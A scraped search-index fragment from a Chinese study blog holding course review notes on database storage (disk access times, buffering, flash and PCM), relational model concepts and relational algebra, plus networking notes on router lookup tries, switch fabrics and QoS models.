相关计算概念 块（Block）\nOS或DBMS进行磁盘数据存取的最小逻辑单元，由若干连续扇区构成 块是DBMS中数据存取的最小单元 扇区是磁盘中数据存储的最小单元 读块时间\n从“发出块存取请求”到“块位于主存”的时间 读块时间＝寻道时间S＋旋转延迟R＋传输时间T＋其它延迟 寻道时间（Seek Time）\n磁头定位到所要的柱面所花费的时间 平均寻道时间\n旋转延迟(Rotation Latency)\n磁盘转动到块的第一个扇区到达磁头所需的时间 平均时间为旋转1/2周所费的时间 一个7200RPM的磁盘 平均旋转延迟 R≈4.17 ms 传输延迟(Transfer Time)\n块的扇区及其间隙旋转通过磁头所需的时间 如果磁道大约有100 000字节，约10ms转一周，则每秒可从磁盘读取约10M字节，一个4K字节的块传输时间小于0.5ms 其它延迟\nCPU请求I/O的时间 (CPU time to issueI/O) 争用磁盘控制器时间 (Contention for controller) 争用总线和主存的时间 (Contention forbus, memory) 如何读下一块？\nCASE 1：下一块在同一柱面上 Sequential I/O 旋转延迟＋传输时间＋其它（忽略） CASE 2：不在一个柱面上 Random I/O 寻道＋旋转＋传输＋其它 写块\n与读块类似 如果需要校验块是否正确写入，则需要加上一次旋转时间和一次块传输时间 块修改\n将块读入主存 在主存中完成修改 将块重新写入磁盘 块地址\n物理设备号 柱面号 盘面号（或磁头号） 扇区号 磁盘例子: Megatron747计算磁盘块存取时间 参数 3.5 inch 3840 RPM 8 surfaces 8192 tracks/surface 256 sectors/track 512 bytes/sector\nMegatron 747大小 = 8*8192*256*512 = 233 = 8 GB\n寻道时间 (最大)：17.4 ms\n磁头启动停止1 ms，每移动500个柱面需1ms\n1 block ＝ 4 KB ＝ 8 sectors\n块之间的间隙占块的10%大小\n每磁道大小=(256/8)*4 KB=128KB=32块\n每柱面大小=8*128KB=1 MB\n3840 RPM → 1/64 秒/转 = 15.625 ms\n读取一个磁道时间=15.625 ms, 其中\n用于磁道数据的时间=15.625 * 0.9=14.0625 ms 用于扇区间隙的时间=15.625*0.1=1.5625 ms 读取一个块的时间=15.625/32－1.5625/256 ≈0.482 ms\n读取数据的时间=15.625/32 * 0.9 ≈ 0.439 ms\nOS或DBMS随机读取一块的最大时间\nT=S＋R＋T=17.4 + 15.625 + 0.482 ≈ 33. 507 ms 最小时间：0.482 ms\n平均时间\nT=S＋R＋T=6.5 + 7.8125 + 0.482 ≈ 14.8 ms 平均寻道数＝8192/3＝2730 (see Fig.13.9)1＋2730/500 = 6.5 例题 磁盘存取优化 按柱面组织数据 减少平均寻道时间 磁盘调度算法 如电梯算法 (Elevator Algorithm) 磁盘阵列(Disk Arrays) 磁盘镜像(Disk Mirrors) Random IO to Sequential IO 预取(Pre-fetch)和缓冲(Buffering) Random IO to Sequential IO 随机I/O（Random I/O）：\n定义：随机I/O 是指以随机的顺序访问数据的方式，即不按照存储介质上的物理顺序进行读取或写入。在随机I/O 中，数据块的访问顺序不是连续的，可能是分散的。\n特点：随机I/O 通常需要更多的时间和资源，因为存储设备不能有效地预取下一个数据块，而需要在不同位置之间移动磁头或访问不同的存储块。随机I/O 对于小型数据集或需要随机查找的操作比较常见。\n示例：从数据库表中随机读取特定记录，访问随机分布的文件块，或执行随机的内存访问操作。\n顺序I/O（Sequential I/O）：\n定义：顺序I/O 是指按顺序访问数据的方式，通常从存储介质中按照顺序读取或写入数据。这种访问模式通常涉及连续的数据块，一次读取或写入一个数据块，然后按照顺序移动到下一个数据块。\n特点：顺序I/O 是按照数据的物理存储顺序来操作的。这意味着数据块的读取或写入通常是高效的，因为存储设备可以预取（预读取）下一个数据块，以提高性能。顺序I/O 对于大型文件和数据集的扫描操作非常高效。\n示例：顺序读取或写入文件的内容，如逐行读取文本文件，逐个扇区地写入磁盘，以及顺序扫描数据库表中的记录等。\n在数据库中，我们经常会遇到两种类型的输入/输出（IO）操作：随机IO和顺序IO¹²³⁵。\n随机IO是指读写操作的访问地址不连续，随机分布在磁盘的地址空间中³。在数据库中，索引访问就是典型的随机读IO¹。例如，当我们需要查找特定的行时，由于I/O的粒度是页级的，其中大部分可能是浪费的⁵。\n顺序IO则是指读写操作的访问地址连续³。在顺序IO访问中，硬盘驱动器（HDD）所需的磁道搜索时间显着减少，因为读/写磁头可以以最小的移动访问下一个块³。在数据库中，全表扫描就是连续读IO¹。例如，当我们进行数据备份和日志记录等业务时，通常会发生在想要的数据块上的所有行⁵。\n在数据库系统的设计中，日志文件采用顺序写入（sequential logging），这是基于传统磁盘访问特性的最大特点¹。数据库中的日志文件，要求必须在事务提交时写入到磁盘，对响应时间的要求很高，所以设计为顺序写入的方式，可以有效降低磁盘寻道花费的时间，减少延迟时间¹。\n然而，数据文件的写入通常包括写数据（写聚簇索引）和写索引（普通索引），所以一般不可能在同一个文件中顺序写入。因此，数据文件的写入通常被视为随机写IO。\n总的来说，\u0026ldquo;Random IO to Sequential IO\u0026quot;可能是指通过某种方式或策略，尽可能地将随机IO转化为顺序IO，以提高数据库的性能。具体的实现方式\n3.2. 存储器结构3.3. 不同类型存储介质之间的差异3.3.1. 闪存(NAND)3.3.2. 相变存储器(PCM)\n预取/缓冲 单缓冲(Single Buffering)\n例：一个文件由一系列块构成：B1, B2,…设有一程序，按下面顺序处理数据：1、处理B1 2、处理B23、处理B3 单缓冲处理策略 (1) 将B1读入缓冲区 (2) 在缓冲区中处理B1中的数据 (3) 将B2读入缓冲区 (4) 处理缓冲区中的B2数据 设 P = 在缓冲区中处理一块的时间,R = 将一块读入缓冲区的时间,n = 块数.单缓冲处理时间 = n(P+R) 双缓冲(Double Buffering)\n双缓冲处理时间＝R＋nP（P\u0026gt;=R）＝ nR＋P（R\u0026gt;=P） 操作系统-单缓冲区与双缓冲区计算_哔哩哔哩_bilibili 19-磁盘管理-磁盘单缓冲区与双缓冲区读取_哔哩哔哩_bilibili\n缓冲的缺点\n主存代价 缓冲区管理 一致性维护 块大小选择\nI/O次数 ↓ 可能读入大量无用数据 每次I/O要花费更多时间 趋势 - 大块 新型存储 计算机系统性能依赖于 处理器的数据计算能力 存储层次向处理器传输数据的能力 随着多/众核、多线程技术的发展，传统存储器件构成的存储层次面临的存储墙问题愈发严重 处理单元（核）数的增长与存储数据供应能力（容量）不匹配 SRAM/DRAM的功耗过高 新型存储器件包括：闪存、相变存储器、磁阻式存储、电阻式存储器、忆阻器等等。具备一个共同特点：非易失性 优点：高存储密度、低功耗、无机械延迟、存取速度快、便携、抗震、低噪音等 缺点：读写性能不对称、读写次数有限、可靠性不高等 闪存 相变存储器 闪存的工业化程度最高\nSSD（solid state drive） 闪存芯片+控制器+FTL（WL, LBA-PBA, GC） （NAND）闪存的特点\n读写不对称 写慢读快 写前擦除：异位更新、块擦除操作 寿命有限：块擦除次数有限 SLC （约10万次擦写） MLC（小于1万次） TLC（小于1000次） 按页读写 E.g., 1 page =2 KB 按块擦除 E.g., 1 block = 64 pages 相变存储器 Phase Change Memory PCM 起源于20世纪60年代 电阻式非易失性半导体存储器 以硫族化物材料作为存储介质，利用相变材料在不同结晶状态时呈现出显著的电阻值差异性来实现数据存储 基于新型存储的计算机架构 ","date":"2024-01-10T03:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC3%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/","title":"第3章 数据存储"},{"content":"数据库体系结构 从模式的角度描述一般数据库系统的概念和结构\n可以用于解释特定数据库系统的内部结构\nANSI/SPARC体系结构——三级模式结构＋两级映象\nOracle、Informix等SQL数据库系统的模式结构可通过ANSI/SPARC体系结构进行解释 模式（Schema）和实例（Instance）\n模式是数据库中全体数据的逻辑结构和特征的描述，它仅仅涉及类型的描述，不涉及具体的值 模式的一个具体值称为模式的一个实例 模式类型 描述 特点 视图 DDL 概念模式 数据库中全体数据的逻辑结构和特征的描述 不涉及数据物理存储的细节和硬件环境，一个数据库只有一个概念模式 概念视图 通过模式DDL进行定义 外模式 单个用户所看到的局部数据的逻辑结构和特征的描述 用户与数据库系统的数据接口，对于用户而言，外模式就是数据库，同一模式上可有多个不同的外模式 外部视图 通过子模式DDL进行定义 内模式 数据物理结构和存储方式的描述 不涉及物理块（或页）的大小，也不考虑具体设备的柱面或磁道大小，一个数据库只有一个内模式 内部视图 通过内模式DDL定义 数据库的三级模式结构 概念模式（模式、逻辑模式）\n数据库中全体数据的逻辑结构和特征的描述 数据记录由哪些数据项构成 数据项的名字、类型、取值范围 数据之间的联系、数据的完整性等 不涉及数据物理存储的细节和硬件环境 一个数据库只有一个概念模式 概念视图：概念模式的实例 通过模式DDL进行定义 外模式（子模式、用户模式）\n单个用户所看到的局部数据的逻辑结构和特征的描述 用户与数据库系统的数据接口，对于用户而言，外模式就是数据库 建立在概念模式之上，同一模式上可有多个不同的外模式 外部视图：外模式的实例 通过子模式DDL进行定义 内模式（存储模式）\n数据物理结构和存储方式的描述 记录的存储方式：顺序存储、按B树组织还是散列存储？ 索引按什么方式组织：排序、散列？ 数据是否加密？是否压缩存储？ 不涉及物理块（或页）的大小，也不考虑具体设备的柱面或磁道大小 一个数据库只有一个内模式 内部视图：内模式的实例 通过内模式DDL定义 二级映象和数据独立性 二级映象实现三级模式结构间的联系和转换，使用户可以逻辑地处理数据，不必关系数据的底层表示方式和存储方式 外模式/模式映象\n定义了外模式与概念模式之间的对应关系 属性名称可能不同 外模式中的属性可能由模式中的多个属性运算而得 当概念模式发生改变时，只要修改外模式/模式映象，可保持外模式不变，从而保持用户应用程序不变，保证了数据与用户程序的逻辑独立性——数据的逻辑独立性 模式/内模式映象\n定义了概念模式与内模式之间的对应关系 - 概念模式中的逻辑记录和字段在内部如何表示 当数据库的内部存储结构发生改变时，只要修改模式/内模式映象，可保持概念模式不变，从而保持外模式以及用户程序的不变，保证了数据与程序的物理独立性——数据的物理独立性 SQL数据库体系结构 关系型数据库 使用数据库技术，首先必须把现实世界中的事物表示为计算机能够处理的数据 模型是对现实世界特征的抽象 数据模型是对现实世界数据特征的抽象 数据模型的定义 描述现实世界实体、实体间联系以及数据语义和一致性约束的模型 数据模型的分类 概念数据模型（概念模型）\n按用户的观点对数据进行建模，强调语义表达功能 独立于计算机系统和DBMS 主要用于数据库的概念设计 结构数据模型（数据模型）\n按计算机系统的观点对数据进行建模，直接面向数据库的逻辑结构 与计算机系统和DBMS相关（DBMS支持某种数据模型） 有严格的形式化定义，以便于在计算机系统中实现 数据抽象的层次 数据模型的例子 现实世界\n客户存款 信息世界\n概念模型（E-R模型） 机器世界\n数据模型（关系模型 数据模型的要素 数据结构 现实世界实体及实体间联系的表示和实现 数据操作 数据检索和更新的实现 数据的完整性约束 数据及数据间联系应具有的制约和依赖规则 关系模型 关系模型 用规范化的二维表格结构表示实体集，外码表示实体间联系，三类完整性表示数据约束的数据模型 几个术语 术语 定义 属性(Attribute) 二维表格的每一列称为关系的一个属性，列的数目称为度（degree） 元组(Tuple) 每一行称为关系的一个元组，元组的数目称为势（cardinality） 域(Domain) 一组具有相同数据类型的值的集合。每个属性有一个域 关系（Relation） 元组的集合 超码（Super Key） 在关系中能唯一标识一个元组的属性集称为关系模式的超码 候选码（Candidate Key） 不含多余属性的超码 主属性（Primary Attribute） 包含在任何一个候选码中的属性 非主属性（Nonprime Attribute） 不包含在任何一个候选码中的属性 主码（Primary Key） 用户选作元组标识的一个候选码称为主码，其余的候选码称为替换码（Alternate Key） Student(Sno, Name, Age, LibraryID) 超码 (sno,name) (libraryID, name) … 候选码 Sno LibraryID 主码 若选sno，则sno为主码，libraryID为替换码 若选libraryID，则libraryID 为主码， sno为替换码 关系的性质 一个关系是一个规范化的二维表格\n属性值不可分解 不允许表中有表 元组不可重复\n因此一个关系模式至少存在一个候选码 没有行序，即元组之间无序\n关系是元组的集合，集合的元素是无序的 没有列序，即属性之间无序\n关系模式是属性的集合 关系模式与关系数据库 关系模式（Relation Schema）\n关系的逻辑结构和特征的描述 对应于二维表格的表头 通常由属性集和各属性域表示，不关心域时可省略域 Student（Name, Age, Class） 关系：关系模式的实例，即二维表（元组的集合）\n关系数据库模式（Relational DatabaseSchema）：关系模式的集合\n关系数据库：关系数据库模式的实例\n关系模式的形式化定义 关系模式可以形式化定义为：\nR（U，D，dom，F） R为关系模式名，U是一个属性集，D是U中属性的值所来自的域，Dom是属性向域的映射集合，F是属性间的依赖关系 例：Student关系模式的定义\nStudent(U,D,dom,F) U={sno,name,age} D={CHAR,INT} Dom={dom(sno)=dom(name)=CHAR,dom(age)=INT} F={sno→name, sno→age} 关系模式通常简写为R(U)，或R(A1,A2,…,An)\n函数依赖 R(U，D，dom，F)中的F在实际中一般只考虑函数依赖\n函数依赖(Functional Dependency, FD)是指一个关系模式中一个属性集和另一个属性集间的多对一关系\n例如选课关系SC(S#, C#, Score) 存在由属性集{S#, C#}到属性集{Score}的函数依赖 对于任意给定的S#值和C#值，只有一个Score值与其对应 反过来，可以存在多个S#值和C#值，它们对应的Score值相等 函数依赖（FD，Functional Dependency）的形式化定义\n设关系模式R(A1,A2,…,An)或简记为R(U)，X和Y是U的子集。r是R的任意一个实例（关系），若r的任意两个元组t1、t2，由t1[X]=t2[X]可导致t1[Y]=t2[Y]，即如果X相等则Y也相等，则称Y函数依赖于X或称为X函数决定Y，记作 X→Y 即R的X属性集上的值可唯一决定R的Y属性集上的值 也即对于R的任意两个元组，X上的值相等，则Y上的值也必相等 FD是相对于关系模式而言的，因此关系模式R的所有实例都要满足FD\n例如\nStudent关系模式中，{S#} →{Sname} （单个属性可去掉括号，简写成 S# →Sname ） SC关系模式中， {S#,C#} →{Score} FD是否成立，唯一办法是仔细考察应用中属性的 含义。FD实际上是对现实世界的断言。数据库设计者在设计时把应遵守的函数依赖通知DBMS，则DBMS会自动检查关系的合法性\n对于关系模式 R( Tname, Addr, C#, Cname) 若一门课只能有一个教师，则有{C#} →{Tname} 若一门课可有多个教师任教，则{C#} →{Tname}不成立 因此FD是与具体应用相关的 关系模型的形式化定义 数据结构 - 关系：数据库中全部数据及数据间联系都以关系来表示 数据操作 关系运算 关系代数 关系演算（元组关系演算、域关系演算） 数据的完整性约束 关系模型的三类完整性规则 关系代数(Relational Algebra) 以关系为运算对象的一组运算集合\n运算结果仍是关系\n以集合操作为基本运算 关系代数表达式的符号\n数学符号表示 并∪ 、交∩、差－、笛卡儿积× 选择σ 、投影π 、联接 ∞ 、除÷ 重命名 ρx（E） 赋值 ← 英语关键字表示\n并Union、交Intersect、差Minus、笛卡儿积Times、选择Where…、投影{All But…}、联接Join、除Devidedby 关系代数的封闭性\n任意关系代数操作的结果仍是一个关系 关系代数的封闭性保证了关系代数操作的可嵌套性\n例子：\n关系代数表达式\n关系模型中数据操作都通过关系代数表达式来表示 关系代数中的基本表达式是关系代数表达式，基本表达式由如下之一构成：\n数据库中的一个关系 一个常量关系 设E1和E2是关系代数表达式，则下面的都是关系代数表达式：\nE1∪E2 、E1－E2、E1×E2 σP(E1),其中P是E1中属性上的谓词 πs(E1),其中S是E1中某些属性的列表 ρx(E1),其中x是E1结果的新名字 关系代数操作的语义\n并∪ 、交∩、差－、笛卡儿积× 选择σ 、投影π 、联接 ∞ 、除÷ 并\nR∪S＝｛t∣t∈R∨t∈S｝ t是元组变量 R和S是关系代数表达式 R与S的degree必须相同 R与S的类型必须相同 交\nR∩S＝｛t∣t∈R∧t∈S｝ 差\nR－S＝｛t∣t∈R∧t S｝ 积\nR×S＝｛t∣t=\u0026lt;tr,ts\u0026gt;∧tr∈R∧ts∈S｝ 选择\nσF(R)＝｛t∣t∈R∧F(t)=TRUE｝ 水平划分关系 F是一个逻辑表达式，表示所选的元组应满足的条件 F由逻辑运算符┐(NOT)、∧(AND)、∨(OR)连接算术表达式构成 算术表达式形为XθY，θ可以是\u0026gt;,\u0026lt;,=, ≤,≥或≠，X和Y可以是属性名、常量或简单函数 投影\nπA(R)＝｛t[A]∣t∈R｝,其中A是R的属性子集 垂直划分关系，选取若干列所构成的关系 A中的属性不可重复 联接：自然联接\n设R的属性集为{X,Y}，S的属性集为{Y,Z} R∞S=t|t=\u0026lt;X,Y,Z\u0026gt;∧t[X,Y]∈R∧t[Y,Z]∈S} 相当于在R×S中选取R和S的所有公共属性值都相等的元组，并在结果中去掉重复属性 联接： θ联接\n设R的属性集为{X,Y}，S的属性集为{Y,Z} 相当于在R×S中选取R的属性A值与S的属性B值满足比较关系θ的元组。 联接： 等值联接（equijoin）\n在θ联接中θ为等号时，称为“等值联接” 等值联接是θ联接中比较常见的形式 数据更新仍通过关系代数实现\n删除\nR←R－E：R是关系，E是关系代数查询 例“从数据库中删除姓名为‘Rose’的学生” Student←Student－σname=‘Rose’(Student) 插入\nR←R∪E：R是关系，E是关系代数表达式 如果E是常量关系，则可以插入单个元组 例：插入一个新的学生 S1←S1∪ { (‘001’,’Rose’,19) } 修改\n关系模型的三类完整性规则 实体完整性（Entity Integrity）\n关系模式R的主码不可取空值 参照完整性（Referential Integrity）\n外码（Foreign Key） 关系模式R的外码是它的一个属性集FK，满足： 存在带有候选码CK的关系模式S，且 R的任一非空FK值都在S的CK中有一个相同的值 S称为被参照关系（Referenced Relation），R称为参照关系（Referential Relation） 参照关系R的任一个外码值必须 等于被参照关系S中所参照的候选码的某个值 或者为空 用户自定义完整性（User-Defined Integrity）\n针对某一具体数据的约束条件，反映某一具体应用所涉及的数据必须满足的特殊语义 由应用环境决定 SQL 数据库语言\n数据库语言是用户使用数据库的接口，DBMS支持用户通过数据库语言进行数据存取与管理 有三类数据库语言\n数据定义语言(Data Definition Language, DDL) 数据操纵语言(Data Manipulation Language， DML) 数据控制语言 (Data Control Language, DCL) SQL基本组成 SQL与关系模型 数据结构: SQL使用表来组织和存储数据。 在关系模型中，数据以关系的形式组织。 数据操作: SQL使用数据操纵语言（DML）进行操作，如SELECT、INSERT、UPDATE、DELETE。 关系模型使用关系代数进行数据操作。 数据约束: SQL包含主键、外键、唯一和检查等约束。 在关系模型中，约束涉及实体完整性（确保每行具有唯一标识符）、参照完整性（维护表之间的关系）和用户自定义完整性（用户定义的其他约束 习题 ","date":"2024-01-10T01:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC2%E7%AB%A0-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E9%A1%BE/","title":"第2章 关系型数据库回顾"},{"content":"1.1. DBMS系统结构组成 数据库、DBMS、数据库系统等基本概念 数据 数据(Data)是数据库中存储的基本对象 数据的定义 人们用来反映客观世界而记录下来的可以鉴别的符号 数据的种类 数值数据：0－9 非数值数据：字符、文字、声音、图形、图像等 数据的特点 数据与其语义是不可分的 例子1：93是一个数据 语义1：学生某门课的成绩 语义2：某人的体重 语义3：计算机学院2016级学生人数 例子2：学生档案记录（李明，197205，中国科大，1990） 语义1：学生，出生年月，所在学校，毕业年份 语义2： 学生，出生年月，录取大学，入学时间 数据库 数据库的定义 数据库(Database,简称DB)是长期储存在计算机内、有 组织的、可共享的大量数据的集合 数据库的基本特征 数据按一定的数据模型组织、描述和储存 可为各种用户共享 数据间联系密切，具有最小的冗余度和较高的独立性 服务于某个特定的应用 例：图书馆的图书数据库、机场的航班数据库、银行数据库…… 数据库模式 (Schema) 数据库模式是数据库中全体数据的逻辑结构和特征的描述 ![[Pasted image 20240108110812.png]]\n数据库管理系统 DBMS（Database Management System），是计算机程序的集 合，用于创建和维护数据库 ![[Pasted image 20240108110347.png]]\n位于操作系统和用户应用之间 总是基于某种数据模型 数据库厂商的产品通常指DBMS，如Oracle11g、Microsoft SQL Server 2008、DB2、MySQL等 DBMS一般架构 ![[Pasted image 20240108210938.png]]\n数据库系统 DBS（DataBase System），指在计算机系统中引入了数据库后的系统，即采用了数据库技术的计算机系统 数据库设计问题 如何设计和实现一个DBMS来高效的组织和管理数据库？——DBMS实现问题 研究生课程内容 如何针对特定应用的需求设计一个合理的数据库结构？——数据库设计问题 本科课程内容 应用程序如何有效地存取数据库中的数据？——数据库存取问题 本科课程内容 DBMS实现问题 1、一个虚拟的DBMS：Megatron2000\nUNIX下的关系型DBMS，支持SQL 实现细节 关系通过文件（ASCII）存储，e.g. R存储在/usr/db/R中 Smith # 123 # CS Jones # 522 # EE - 数据库模式存储在特定的文件（ASCII）中 R1 # A # INT # B # STR … R2 # C # STR # A # INT … Megatron 2000如何执行查询？ 执行 “select * from R where condition”:\n读数据字典获取R的属性 读R对应的文件，对于每一行数据: 检查条件 如果条件满足，则输出 执行”select A,B from R,S where condition”:\n读数据字典获取R和S的属性 读R文件，对于每一行数据: 读S文件，对于每一行数据: 生成连接元组 检查条件 若条件满足，则输出 Megatron 2000功能总结\n可以定义表 可以进行数据操作 数据更新 数据查询 Megatron 2000 存在什么问题？\n元组平铺在磁盘上\n将 ’EE’改为 ’ECON’，需要重写整个文件 ASCII存储过于昂贵 删除操作同样代价很高 低级的查询处理\n例，select *from Student S,SC where S.sno = SC.sno and SC.credit \u0026gt; 3 先做连接比先做选择效率要低 未考虑更高效的连接算法 没有缓冲区管理\n数据直接从磁盘存取，磁盘I/O的代价昂贵 需要Buffer来加速数据存取效率 没有并发控制\n多用户同时存取数据时数据一致性得不到保证 没有索引；数据查询效率低\n不能快速地根据给定键值查询元组 总是要读入整个关系 没有可靠性\n发生数据库系统故障时没有恢复机制 易出现数据不一致的情形 没有应用程序编程接口（API）\n应用如何存取数据库？ 糟糕的数据字典组织\n","date":"2024-01-10T00:40:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/%E7%AC%AC1%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/","title":"第1章 数据库系统概述"},{"content":"路由器功能与架构 数据路径功能 根据分组目的IP地址查找转发表 通过交换结构转发到输出端口 输出端口调度和队列管理 控制面功能 运行路由协议，构建路由表 系统配置和管理 路由查找算法 Binary Trie ![[Pasted image 20240102174052.png]] ![[Pasted image 20240102174131.png]]\n####性能\n最差情况下，查找算法需要遍历Trie的所有层次，所以最差情况下需要有W次存储器访问，W为前缀的最大长度，对于IPv4为32，查找复杂度和更新复杂度为O(W) 最差情况下，增加一个前缀，需要增加W个节点，存储复杂度为O(NW)，N为转发表中的前缀数量 Leaf Pushing ![[Pasted image 20240102174439.png]]\nPath Compression Compression：Trie中只有一个子节点的非前缀节点能够被删除 节点保持Compression相关信息 skip value：指示路径上有多少个比特被跳过 segment：指示最后一次跳过操作以来具体遗漏的比特串 ![[Pasted image 20240102175058.png]] 性能 路径压缩可以有效地减少稀疏binary trie的高度 在最差情况下，没有压缩的可能，因此采用路径压缩后查询和更新复杂度与binary trie一样，都是O(W) Multi-bit Trie 查找时同时检查多个比特，称为查找步长（Stride） 如果前缀长度不为步长的整数倍，则对其进行扩充 例如步长为3，对于前缀1*可以扩充为100,101,110,111 步长为k，则Trie中的每个节点的条目数量为2k 每个条目组成：\u0026lt;下一跳信息，指向下一个子节点的指针（可以为空）\u0026gt; ![[Pasted image 20240102183349.png]] 性能 步长为k比特，则查找的复杂度为O(W/k)，W为地址的长度 更新复杂度O(W/k*2^k),每个节点有2^k个条目 存储（空间）复杂度O(N*2^k*W/k),N为转发表表项数量 Leaf Pushing优化 节点上的每个条目要么包含一个指针，要么包含下一跳信息 相当于把下一跳信息Push down到叶子节点 存储空间减少为1/2 ![[Pasted image 20240102183713.png]] LC Trie构造 节点分布稀疏时，Path Compression是压缩Trie的有效途径 固定步长multi-bit能够提高查找性能，但是当节点分布稀疏时存储冗余大 节点分布越密，存储效率越高，完全Trie无冗余！\n如果Trie的中间节点包含前缀，则进行Leaf Pushing操作，使得Trie中只有叶子节点包含前缀（即为前缀节点） 通过Path Compression将Trie压缩（就是去掉只有一个孩子的节点） 当子Trie的结构为完全子Trie时执行Multi-bit查找（完全二叉树只留叶子结点） 在LC Trie中每个节点需要保存： Path Compression信息(Skip Value, Segment) Multi-bit查找信息 (Stride) ![[Pasted image 20240102185801.png]]\n性能 查找步长为k，则查找复杂度、更新复杂度及存储复杂度与multi-bit Trie相同 查找复杂度为O(W/k)，W为地址长度 更新复杂度为O(W/k*2^k) 存储（空间）复杂度O(N*2^k*W/k),N为转发表表项数量 tree Bitmap算法 交换结构 概念 吞吐量（Throughput) 当所有的输入端口以线速承载100%的业务的时候，平均汇聚输出速率和平均汇聚输入速率的比率 如果所有空闲输入-输出端口对都可以传输数据，则可以认为吞吐量是100% 线路速率（Line Speed）：简称为线速，交换机端口连接的线路所能达到的最高速率 加速（Speedup） 交换结构的内部转发速率和单个输入端口线速的比值 如果加速超过1，则输出端口必须使用缓存 输出竞争 多个输入端口请求同一个输出端口导致输出竞争 由IP业务的突发性导致 内部阻塞 交换结构内部竞争导致内部阻塞 无阻塞：空闲输入端口和空闲输出端口之间的连接始终可以被建立 空闲端口：没有连接或者没有被请求连接的端口 交换机输出竞争和内部阻塞都会降低吞吐量，但后者是可以避免的，而前者是无法避免的 阻塞一般是指交换结构内部争用所导致，而输出竞争是发生在交换机的输出端口.阻塞和输出竞争是在空分交换中发生，对于时分交换，业务在时间上进行复用可以避免阻塞\n3代交换结构 第一代：共享存储器交换，交换机速率受限于共享的存储器的访问速度，通常汇聚容量小于0.5Gbps 第二代：共享媒介交换，交换机速率受限于共享的总线（媒介）速率，通常汇聚容量小于5Gbps 第三代：空分交换，交换机速率受限于交换结构，通常汇聚容量可达到50Gbps甚至更高 Banyan交换结构 Banyan交换结构为单路径多级交换结构 多级交换结构一般是由较小的交换单元组成的大的交换系统，也称为交换网络，交换单元常用2×2 Crossbar 共有log2N级，每一级都有N/2个交换单元，总交叉点数量：Nx=4×N/2× log2N ![[Pasted image 20240102195733.png]] ![[Pasted image 20240102195858.png]] 输入队列与输出队列 ![[Pasted image 20240102200202.png]]\n![[Pasted image 20240102200038.png]]\n","date":"2024-01-03T18:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/%E4%BF%A1%E6%81%AF%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E7%AC%AC%E5%85%AD%E7%AB%A0/","title":"信息网络协议基础第六章复习"},{"content":"•基本概念\n–QoS度量参数；流、行为集合、服务等级协议\n基本概念 QoS度量参数 常用的描述QoS需求的参数包括：带宽、延迟、延迟抖动、突发（峰值）速率、最大突发长度、丢包率\n带宽 ：给定介质、协议或连接的额定吞吐量，实际上指应用程序在网络中通信所需要的“管道大小”，也可以认为是用户对网络传输速率的要求 最小带宽（最小分组速率）：传输中的最小瞬时速率，可用产生两个相邻分组的最大时间间隔的倒数来表示 峰值带宽（峰值分组速率）：传输中的最大瞬时速率，可用产生两个相邻分组的最短时间间隔的倒数来表示 平均带宽（平均分组速率）：一段时间内分组传输的平均速率 延迟：分组从发送端到达接收端的时间间隔 传输延迟：发送分组的第一个比特到发送最后一个比特的时间间隔，取决于发送接口的速率和分组的大小 传播延迟：发送分组的一个比特到接收端接收到该比特的时间间隔，取决于传输介质和传输距离 处理延迟：分组从到达节点到进入输出队列的时间间隔，包括对分组头标处理，路由查找等，取决于节点的处理能力和分组处理的复杂度 排队延迟：分组从进入输出队列到开始输出的时间间隔，取决于队列长度和调度策略 ![[Pasted image 20240102164138.png]] 延迟抖动：端到端延迟的变化特性，由延迟的可变部分的变化导致的，流量的突发、不公平的队列调度算法都可能导致较大的延迟抖动 流 从一个源到一个目的的有序分组集合被称为一个流（Flow) 一般来说，流是由特定于具体应用并且具有相同QoS需求的分组所组成 一个流和一个应用会话（Session）相对应，所以在后面叙述中有时将流的概念和会话的概念等同 ==IP网络中通常用五元组\u0026lt;源IP地址、目的IP地址、源端口号、目的端口号、协议\u0026gt;来标识一个流== 在面向连接的网络中，属于同一个流的所有分组将会走相同的路径到达目的地 ，在无连接的网络中，属于同一个流的分组可能会走不同的路径到达目的地 行为集合 在路由器上执行相同QoS操作的分组的集合 多个流如果具有相同的QoS操作，则在路由器上可以汇聚成一个行为集合 ==行为集合有时与类（Class）的概念等同，流可以看作是只有1个流的行为集合或者类== 支持QoS操作的路由器功能 接纳控制 当应用要求QoS服务时，判断其要求是否能够得到满足，应该是放在每个网络的入口路由器上 流量调节 检查到达的分组是否满足SLA中设定的QoS水平，如果不满足，实施事先指定的整形操作，包括丢弃、延迟、重标记等 流量控制 为了满足QoS需求（带宽、丢包率、延迟、延迟抖动等），选择是否向输出链路输出分组以及控制分组的输出顺序（即队列管理和调度），该功能设置在输出端口处 两个服务质量模型 综合服务原理 资源预留 发送应用通过建立消息将想发送流的流量特性发送给路径上的每个路由器和接收主机 路径上路由器在建立消息中附加上可以提供的QoS信息（例如预测的延迟等）送给接收主机 接收应用接收预留建立消息中的QoS信息，决定数据传输所需QoS参数，并将其通过预留消息沿相反路径通知给沿途路由器和发送主机 路径上的路由器根据预留消息预留所需网络资源 数据流传输 发送主机发送遵循预留规定的数据流 流量调节 中间路由器监测数据流是否满足预留规定，如果不满足 对于保证型服务，采用整形 对于受控负载型服务，将不符合的分组转为尽力服务 流量控制 路由器根据指定的服务类型，对每个流的分组进行调度和队列管理，实现指定QoS（带宽、延迟等） 综合服务类型 ![[Pasted image 20240102171144.png]]\n综合服务缺点 基于流的细粒度资源分配，存在可扩展性问题 带宽、存储、处理开销随着流的数量的增加而急剧增长 区分服务原理 预先设置PHB 